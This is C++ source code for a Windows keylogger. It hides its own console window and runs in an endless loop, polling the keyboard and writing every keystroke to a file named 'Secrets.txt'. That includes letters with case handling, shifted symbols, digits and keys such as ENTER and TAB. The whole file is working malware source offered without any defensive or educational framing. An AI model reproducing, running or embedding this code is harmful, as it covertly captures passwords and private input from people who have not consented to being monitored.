#include <Windows.h>
#include <WinUser.h>
#include <fstream>
#include <iostream>

using namespace std;

//hide the app window
void hideAppWindow() {
	HWND consoleWindow = GetConsoleWindow();
	//AllocConsole();
	//consoleWindow = FindWindowA("", NULL);
	ShowWindow(consoleWindow, 0);
}

int main() {
	//hide the app window
	hideAppWindow();
	unsigned char keyPressed;
	ofstream secrets("Secrets.txt", ios::out);

	while (true) {

		Sleep(0);

		for (keyPressed = 8; keyPressed < 256; keyPressed += 1) {

			if (GetKeyState(VK_SHIFT) & 0x8000)
			{
				//=== special chars generated by SHIFT + numeric symbols & special chars like [ ] ; ' , . / \ - = ===//
				if (GetAsyncKeyState(VK_OEM_4) == -32767)
				{
					secrets << "{"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_6) == -32767)
				{
					secrets << "}"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_1) == -32767)
				{
					secrets << ":"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_7) == -32767)
				{
					secrets << "\""; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_COMMA) == -32767)
				{
					secrets << "<"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_PERIOD) == -32767)
				{
					secrets << ">"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_2) == -32767)
				{
					secrets << "?"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_5) == -32767)
				{
					secrets << "|"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_MINUS) == -32767)
				{
					secrets << "_"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_PLUS) == -32767)
				{
					secrets << "+"; secrets.flush(); break;
				}
			}
			else
			{
				//=== special chars like [ ] ; ' , . / \ - = ===//
				if (GetAsyncKeyState(VK_OEM_4) == -32767)
				{
					secrets << "["; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_6) == -32767)
				{
					secrets << "]"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_1) == -32767)
				{
					secrets << ";"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_7) == -32767)
				{
					secrets << "'"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_COMMA) == -32767)
				{
					secrets << ","; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_PERIOD) == -32767)
				{
					secrets << "."; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_2) == -32767)
				{
					secrets << "/"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_5) == -32767)
				{
					secrets << "\\"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_MINUS) == -32767)
				{
					secrets << "-"; secrets.flush(); break;
				}
				if (GetAsyncKeyState(VK_OEM_PLUS) == -32767)
				{
					secrets << "="; secrets.flush(); break;
				}
			}

			if (GetAsyncKeyState(keyPressed) == -32767)
			{
				SHORT keyStateCapsLock = GetKeyState(VK_CAPITAL);
				bool isToggledCapsLock = keyStateCapsLock & 1;

				//=== lowercase & uppercase cases===//
				if (keyPressed >= 65 && keyPressed <= 90) {

					if (!isToggledCapsLock && !(GetKeyState(VK_SHIFT) & 0x8000))
						keyPressed += 32;
					if (isToggledCapsLock && (GetKeyState(VK_SHIFT) & 0x8000))
						keyPressed += 32;
					if (isToggledCapsLock && !(GetKeyState(VK_SHIFT) & 0x8000))
						keyPressed += 0;
					if (!isToggledCapsLock && (GetKeyState(VK_SHIFT) & 0x8000))
						keyPressed += 0;

					secrets << keyPressed;
					secrets.flush();
					break;
				}

				//=== TAB ===//
				if (keyPressed == VK_TAB) {
					secrets << "TAB";
					secrets.flush();
					break;
				}
				//=== DEL ===//
				if (keyPressed == VK_DELETE) {
					secrets << "DEL";
					secrets.flush();
					break;
				}
				//=== ESC ===//
				if (keyPressed == VK_ESCAPE) {
					secrets << "ESC";
					secrets.flush();
					break;
				}
				//=== ENTER ===//
				if (keyPressed == VK_RETURN) {
					secrets << "ENTER";
					secrets.flush();
					break;
				}
				//=== CAPSLOCK key ===//
				if (keyPressed == VK_CAPITAL) {
					secrets << "CAPSLOCK";
					secrets.flush();
					break;
				}
				//=== UP ARROW key ===//
				if (keyPressed == VK_UP) {
					secrets << "UP_ARROW";
					secrets.flush();
					break;
				}
				//=== DOWN ARROW key ===//
				if (keyPressed == VK_DOWN) {
					secrets << "DOWN_ARROW";
					secrets.flush();
					break;
				}
				//=== LEFT ARROW key ===//
				if (keyPressed == VK_LEFT) {
					secrets << "LEFT_ARROW";
					secrets.flush();
					break;
				}
				//=== RIGHT ARROW key ===//
				if (keyPressed == VK_RIGHT) {
					secrets << "RIGHT_ARROW";
					secrets.flush();
					break;
				}

				//=== special chars generated by SHIFT + numeric symbols & special chars like [ ] ; ' , . / \ - = ===//
				if (keyPressed >= 48 && keyPressed <= 57) {
					if (GetKeyState(VK_SHIFT) & 0x8000) {
						if (keyPressed == '0') keyPressed = ')';
						if (keyPressed == '1') keyPressed = '!';
						if (keyPressed == '2') keyPressed = '@';
						if (keyPressed == '3') keyPressed = '#';
						if (keyPressed == '4') keyPressed = '$';
						if (keyPressed == '5') keyPressed = '%';
						if (keyPressed == '6') keyPressed = '^';
						if (keyPressed == '7') keyPressed = '&';
						if (keyPressed == '8') keyPressed = '*';
						if (keyPressed == '9') keyPressed = '(';
					}
					secrets << keyPressed;
					secrets.flush();
					break;
				}
			}
		}
	}
}
